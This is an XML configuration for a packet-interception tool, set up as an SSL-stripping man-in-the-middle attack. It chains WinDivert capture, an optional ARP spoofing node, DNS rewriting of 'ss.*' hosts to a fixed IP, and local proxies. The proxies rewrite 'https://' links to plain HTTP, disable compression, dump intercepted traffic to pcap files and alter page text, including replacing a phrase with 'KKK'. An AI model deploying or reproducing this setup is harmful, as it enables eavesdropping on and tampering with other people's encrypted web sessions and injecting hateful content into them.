<sslstrip>
  <graph>
    <objectList>
      <object layer="0" autoRead="true" autoParse="true" tos="0" correctChecksum="true" _class="SnoopWinDivert" filter="(ifIdx!=1) and outbound and (tcp.DstPort==80 or tcp.DstPort==8080 or tcp.DstPort==8888 or tcp.DstPort==443 or tcp.DstPort==4433 or udp.DstPort==53)" queueLen="8192" queueTime="1024" enabled="true" priority="0" name="wdOutbound" flags="0"/>
      <object snapLen="1600" autoRead="true" autoParse="true" _class="SnoopArpSpoof" filter="tcp dst port 80 or tcp dst port 8080 or tcp dst port 8888 or tcp dst port 443 or tcp dst port 4433" selfRelay="true" enabled="false" virtualMac="000000-000000" disableAutoRouting="true" readTimeout="1" adapterIndex="0" name="as" infectInterval="1000" flags="1">
        <sessionList/>
      </object>
      <object udpFlowTimeout="300" _class="SnoopFlowMgr" tcpFlowTimeout="300" ipFlowTimeout="300" name="fmOutboundProcessFilter" checkInterval="1" macFlowTimeout="3600"/>
      <object _class="SnoopProcessFilter" flowMgr="fmOutboundProcessFilter" name="pfOutbound" showStatus="false">
        <policies>
          <policy processName="" ack="false"/>
          <policy processName="chrome.exe" ack="false"/>
          <policy processName="firefox.exe" ack="false"/>
          <policy processName="httpproxy.exe" ack="true"/>
          <policy processName="iexplore.exe" ack="false"/>
          <policy processName="netclient.exe" ack="false"/>
          <policy processName="netserver.exe" ack="true"/>
          <policy processName="snoopspy.exe" ack="true"/>
          <policy processName="sscon.exe" ack="true"/>
          <policy processName="svchost.exe" ack="false"/>
        </policies>
      </object>
      <object udpFlowTimeout="300" _class="SnoopFlowMgr" tcpFlowTimeout="300" ipFlowTimeout="300" name="fmOutbound" checkInterval="1" macFlowTimeout="3600"/>
      <object layer="0" autoRead="true" autoParse="true" tos="0" correctChecksum="true" _class="SnoopWinDivert" filter="(ifIdx==1) and (tcp.SrcPort=8079 or tcp.SrcPort=4432 or tcp.SrcPort=8042)" queueLen="8192" queueTime="1024" enabled="true" priority="0" name="wdInbound" flags="0"/>
      <object udpFlowTimeout="300" _class="SnoopFlowMgr" tcpFlowTimeout="300" ipFlowTimeout="300" name="fmInboundProcessFilter" checkInterval="1" macFlowTimeout="3600"/>
      <object _class="SnoopProcessFilter" flowMgr="fmInboundProcessFilter" name="pfInbound" showStatus="false">
        <policies>
          <policy processName="" ack="false"/>
          <policy processName="httpproxy.exe" ack="true"/>
          <policy processName="netserver.exe" ack="true"/>
          <policy processName="snoopspy.exe" ack="true"/>
          <policy processName="sscon.exe" ack="true"/>
        </policies>
      </object>
      <object udpFlowTimeout="300" _class="SnoopFlowMgr" tcpFlowTimeout="300" ipFlowTimeout="300" name="fmInbound" checkInterval="1" macFlowTimeout="3600"/>
      <object toFlowMgr="fmInbound" _class="SnoopFlowChange" fromFlowMgr="fmOutbound" tcpChange="true" udpChange="false" name="fc">
        <changeItems>
          <item log="true" srcIpFixValue="127.0.0.1" protocol="1" enabled="true" srcIpChangeType="1" dstIp="80.43.80.43" dstPort="80" srcIp="0.0.0.0" srcPortChangeType="1" dstIpChangeType="1" dstIpMask="255.255.255.255" srcIpMask="0.0.0.0" srcPort="0" srcPortFixValue="0" dstPortChangeType="2" dstPortFixValue="8042" dstIpFixValue="127.0.0.1"/>
          <item log="true" srcIpFixValue="127.0.0.1" protocol="1" enabled="true" srcIpChangeType="1" dstIp="80.43.80.43" dstPort="8080" srcIp="0.0.0.0" srcPortChangeType="1" dstIpChangeType="1" dstIpMask="255.255.255.255" srcIpMask="0.0.0.0" srcPort="0" srcPortFixValue="0" dstPortChangeType="2" dstPortFixValue="8042" dstIpFixValue="127.0.0.1"/>
          <item log="true" srcIpFixValue="127.0.0.1" protocol="1" enabled="true" srcIpChangeType="1" dstIp="80.43.80.43" dstPort="8888" srcIp="0.0.0.0" srcPortChangeType="1" dstIpChangeType="1" dstIpMask="255.255.255.255" srcIpMask="0.0.0.0" srcPort="0" srcPortFixValue="0" dstPortChangeType="2" dstPortFixValue="8042" dstIpFixValue="127.0.0.1"/>
          <item log="false" srcIpFixValue="127.0.0.1" protocol="1" enabled="true" srcIpChangeType="1" dstIp="0.0.0.0" dstPort="80" srcIp="0.0.0.0" srcPortChangeType="1" dstIpChangeType="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPort="0" srcPortFixValue="0" dstPortChangeType="2" dstPortFixValue="8079" dstIpFixValue="127.0.0.1"/>
          <item log="false" srcIpFixValue="127.0.0.1" protocol="1" enabled="true" srcIpChangeType="1" dstIp="0.0.0.0" dstPort="8080" srcIp="0.0.0.0" srcPortChangeType="1" dstIpChangeType="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPort="0" srcPortFixValue="0" dstPortChangeType="2" dstPortFixValue="8079" dstIpFixValue="127.0.0.1"/>
          <item log="false" srcIpFixValue="127.0.0.1" protocol="1" enabled="true" srcIpChangeType="1" dstIp="0.0.0.0" dstPort="8888" srcIp="0.0.0.0" srcPortChangeType="1" dstIpChangeType="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPort="0" srcPortFixValue="0" dstPortChangeType="2" dstPortFixValue="8079" dstIpFixValue="127.0.0.1"/>
          <item log="false" srcIpFixValue="127.0.0.1" protocol="1" enabled="true" srcIpChangeType="1" dstIp="0.0.0.0" dstPort="443" srcIp="0.0.0.0" srcPortChangeType="1" dstIpChangeType="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPort="0" srcPortFixValue="0" dstPortChangeType="2" dstPortFixValue="4432" dstIpFixValue="127.0.0.1"/>
          <item log="false" srcIpFixValue="127.0.0.1" protocol="1" enabled="true" srcIpChangeType="1" dstIp="0.0.0.0" dstPort="4433" srcIp="0.0.0.0" srcPortChangeType="1" dstIpChangeType="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPort="0" srcPortFixValue="0" dstPortChangeType="2" dstPortFixValue="4432" dstIpFixValue="127.0.0.1"/>
        </changeItems>
      </object>
      <object layer="0" autoRead="false" autoParse="false" tos="0" correctChecksum="true" _class="SnoopWriteWinDivert" filter="true" changeDivertAddr="true" queueLen="8192" queueTime="1024" IfIdx="1" enabled="true" priority="0" SubIfIdx="0" name="wwdOutbound" Direction="0" flags="1"/>
      <object disableLoopbackConnection="false" _class="VHttpProxy" outInThreadTimeout="30000" keepAliveTimeout="60000" maxContentCacheSize="10485756" tcpEnabled="true" name="hpTcpIn" sslEnabled="false">
        <outPolicy port="8080" method="1" host="127.0.0.1"/>
        <tcpServer onceWriteSize="0" port="8079" _class="VTcpServer" localHost="127.0.0.1"/>
        <sslServer onceWriteSize="0" port="4433" processConnectMessage="false" _class="VSslServer" certificatePath="certificate\" defaultKeyCrtFileName="default.pem" methodType="4" localHost=""/>
        <inboundDataChange/>
        <outboundDataChange>
          <item cs="1" log="false" pattern="Accept-Encoding: gzip," minimal="false" syntax="2" enabled="true" replace="Accept-Encoding:      "/>
        </outboundDataChange>
      </object>
      <object disableLoopbackConnection="true" _class="VHttpProxy" outInThreadTimeout="30000" keepAliveTimeout="60000" maxContentCacheSize="10485756" tcpEnabled="true" name="hpTcpOut" sslEnabled="false">
        <outPolicy port="0" method="1" host=""/>
        <tcpServer onceWriteSize="0" port="8080" _class="VTcpServer" localHost="127.0.0.1"/>
        <sslServer onceWriteSize="0" port="4433" processConnectMessage="false" _class="VSslServer" certificatePath="certificate\" defaultKeyCrtFileName="default.pem" methodType="4" localHost=""/>
        <inboundDataChange>
          <item cs="0" log="true" pattern="MIchael" minimal="false" syntax="2" enabled="true" replace="GILBERT"/>
          <item cs="1" log="true" pattern="https://" minimal="false" syntax="2" enabled="true" replace="http://ss."/>
        </inboundDataChange>
        <outboundDataChange/>
      </object>
      <object disableLoopbackConnection="false" _class="VHttpProxy" outInThreadTimeout="30000" keepAliveTimeout="60000" maxContentCacheSize="10485756" tcpEnabled="false" name="hpSslIn" sslEnabled="true">
        <outPolicy port="4433" method="1" host="127.0.0.1"/>
        <tcpServer onceWriteSize="0" port="8080" _class="VTcpServer" localHost=""/>
        <sslServer onceWriteSize="0" port="4432" processConnectMessage="false" _class="VSslServer" certificatePath="certificate\" defaultKeyCrtFileName="default.pem" methodType="4" localHost="127.0.0.1"/>
        <inboundDataChange/>
        <outboundDataChange>
          <item cs="1" log="false" pattern="Accept-Encoding: gzip," minimal="false" syntax="2" enabled="true" replace="Accept-Encoding:      "/>
        </outboundDataChange>
      </object>
      <object disableLoopbackConnection="true" _class="VHttpProxy" outInThreadTimeout="30000" keepAliveTimeout="60000" maxContentCacheSize="10485756" tcpEnabled="true" name="hpSslOut" sslEnabled="false">
        <outPolicy port="0" method="2" host=""/>
        <tcpServer onceWriteSize="0" port="4433" _class="VTcpServer" localHost="127.0.0.1"/>
        <sslServer onceWriteSize="0" port="4433" processConnectMessage="false" _class="VSslServer" certificatePath="certificate\" defaultKeyCrtFileName="default.pem" methodType="4" localHost=""/>
        <inboundDataChange>
          <item cs="1" log="true" pattern="Mark Zukerberg" minimal="false" syntax="2" enabled="true" replace="GILBERT LEE"/>
          <item cs="1" log="true" pattern="Money for every moment." minimal="false" syntax="2" enabled="true" replace="KKK"/>
        </inboundDataChange>
        <outboundDataChange/>
      </object>
      <object layer="0" autoRead="true" autoParse="true" tos="0" correctChecksum="true" _class="SnoopWinDivert" filter="ifIdx==1 and outbound and (tcp.SrcPort==8080 or tcp.DstPort==8080 or tcp.SrcPort==4433 or tcp.DstPort==4433 or tcp.SrcPort==8043 or tcp.DstPort==8043)" queueLen="8192" queueTime="1024" enabled="true" priority="0" name="wdProxy" flags="1"/>
      <object _class="SnoopDump" filePath="pcap/httpsniff_%04d%02d%02d.%02d%02d.%02d.%03d.pcap" name="dProxy" linkType="1"/>
      <object snapLen="1600" autoRead="false" autoParse="false" _class="SnoopWriteAdapter" filter="" enabled="true" readTimeout="1" adapterIndex="1" srcMac="000000-000000" name="waProxy" dstMac="000000-000000" flags="1"/>
      <object _class="SnoopBpFilter" filter="udp dst port 53" name="BpFilter1" linkType="1"/>
      <object _class="SnoopDnsChange" name="DnsChange1" capture="wdOutbound">
        <changeItems>
          <item cs="1" log="true" pattern="ss.*" minimal="false" syntax="1" enabled="true" ip="80.43.80.43"/>
        </changeItems>
      </object>
      <object disableLoopbackConnection="false" _class="VHttpProxy" outInThreadTimeout="30000" keepAliveTimeout="60000" maxContentCacheSize="10485756" tcpEnabled="true" name="hpStripIn" sslEnabled="true">
        <outPolicy port="8043" method="1" host="127.0.0.1"/>
        <tcpServer onceWriteSize="0" port="8042" _class="VTcpServer" localHost="127.0.0.1"/>
        <sslServer onceWriteSize="0" port="4433" processConnectMessage="false" _class="VSslServer" certificatePath="certificate\" defaultKeyCrtFileName="default.pem" methodType="4" localHost=""/>
        <inboundDataChange/>
        <outboundDataChange>
          <item cs="1" log="false" pattern="Accept-Encoding: gzip," minimal="false" syntax="2" enabled="true" replace="Accept-Encoding:      "/>
          <item cs="1" log="true" pattern="Host: ss." minimal="false" syntax="2" enabled="true" replace="Host: "/>
        </outboundDataChange>
      </object>
      <object disableLoopbackConnection="true" _class="VHttpProxy" outInThreadTimeout="30000" keepAliveTimeout="60000" maxContentCacheSize="10485756" tcpEnabled="true" name="hpStripOut" sslEnabled="false">
        <outPolicy port="0" method="2" host=""/>
        <tcpServer onceWriteSize="0" port="8043" _class="VTcpServer" localHost="127.0.0.1"/>
        <sslServer onceWriteSize="0" port="4433" processConnectMessage="false" _class="VSslServer" certificatePath="certificate\" defaultKeyCrtFileName="default.pem" methodType="4" localHost=""/>
        <inboundDataChange>
          <item cs="1" log="true" pattern="https://" minimal="false" syntax="2" enabled="true" replace="http://ss."/>
        </inboundDataChange>
        <outboundDataChange/>
      </object>
    </objectList>
    <connectList>
      <connect slot="process(SnoopPacket*)" signal="captured(SnoopPacket*)" sender="wdOutbound" receiver="fmOutboundProcessFilter"/>
      <connect slot="process(SnoopPacket*)" signal="captured(SnoopPacket*)" sender="as" receiver="fmOutbound"/>
      <connect slot="check(SnoopPacket*)" signal="processed(SnoopPacket*)" sender="fmOutboundProcessFilter" receiver="pfOutbound"/>
      <connect slot="process(SnoopPacket*)" signal="nak(SnoopPacket*)" sender="pfOutbound" receiver="fmOutbound"/>
      <connect slot="processFromTo(SnoopPacket*)" signal="processed(SnoopPacket*)" sender="fmOutbound" receiver="fc"/>
      <connect slot="process(SnoopPacket*)" signal="captured(SnoopPacket*)" sender="wdInbound" receiver="fmInboundProcessFilter"/>
      <connect slot="check(SnoopPacket*)" signal="processed(SnoopPacket*)" sender="fmInboundProcessFilter" receiver="pfInbound"/>
      <connect slot="process(SnoopPacket*)" signal="ack(SnoopPacket*)" sender="pfInbound" receiver="fmInbound"/>
      <connect slot="processToFrom(SnoopPacket*)" signal="processed(SnoopPacket*)" sender="fmInbound" receiver="fc"/>
      <connect slot="move(SnoopPacket*)" signal="changedFromTo(SnoopPacket*)" sender="fc" receiver="wwdOutbound"/>
      <connect slot="dump(SnoopPacket*)" signal="captured(SnoopPacket*)" sender="wdProxy" receiver="dProxy"/>
      <connect slot="copy(SnoopPacket*)" signal="captured(SnoopPacket*)" sender="wdProxy" receiver="waProxy"/>
      <connect slot="check(SnoopPacket*)" signal="captured(SnoopPacket*)" sender="wdOutbound" receiver="BpFilter1"/>
      <connect slot="check(SnoopPacket*)" signal="ack(SnoopPacket*)" sender="BpFilter1" receiver="DnsChange1"/>
      <connect slot="check(SnoopPacket*)" signal="captured(SnoopPacket*)" sender="as" receiver="BpFilter1"/>
    </connectList>
  </graph>
  <coord>
    <object x="-165" y="-115" name="wdOutbound"/>
    <object x="-258" y="-119" name="as"/>
    <object x="-202" y="-77" name="fmOutboundProcessFilter"/>
    <object x="-164" y="-38" name="pfOutbound"/>
    <object x="-165" y="2" name="fmOutbound"/>
    <object x="3" y="-115" name="wdInbound"/>
    <object x="-36" y="-76" name="fmInboundProcessFilter"/>
    <object x="2" y="-39" name="pfInbound"/>
    <object x="-1" y="1" name="fmInbound"/>
    <object x="-55" y="36" name="fc"/>
    <object x="-175" y="74" name="wwdOutbound"/>
    <object x="-154" y="116" name="hpTcpIn"/>
    <object x="-160" y="154" name="hpTcpOut"/>
    <object x="12" y="115" name="hpSslIn"/>
    <object x="5" y="149" name="hpSslOut"/>
    <object x="-130" y="224" name="wdProxy"/>
    <object x="6" y="199" name="dProxy"/>
    <object x="6" y="238" name="waProxy"/>
    <object x="-302" y="-69" name="BpFilter1"/>
    <object x="-312" y="-27" name="DnsChange1"/>
    <object x="-277" y="117" name="hpStripIn"/>
    <object x="-278" y="156" name="hpStripOut"/>
  </coord>
</sslstrip>
